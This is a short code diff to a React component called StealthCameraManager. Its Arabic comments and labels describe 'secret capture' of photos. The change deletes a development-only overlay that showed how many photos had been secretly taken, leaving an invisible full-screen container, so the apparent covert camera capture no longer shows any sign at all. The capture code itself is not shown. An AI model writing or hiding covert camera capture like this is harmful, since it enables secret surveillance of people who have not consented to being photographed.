@@ -110,12 +110,7 @@ const StealthCameraManager: React.FC<StealthCameraManagerProps> = ({
   if (autoStart) {
     return (
       <div className="fixed inset-0 pointer-events-none">
-        {/* مؤشر تقدم مخفي للتطوير فقط - يمكن إزالته في الإنتاج */}
-        {process.env.NODE_ENV === 'development' && isCapturing && (
-          <div className="fixed top-4 right-4 bg-black/80 text-white p-2 rounded text-xs">
-            التقاط سري: {currentPhotoIndex}/{photoCount}
-          </div>
-        )}
+        {/* تم إزالة مؤشر التقدم المخفي (التقاط سري) بالكامل */}
       </div>
     );
   }
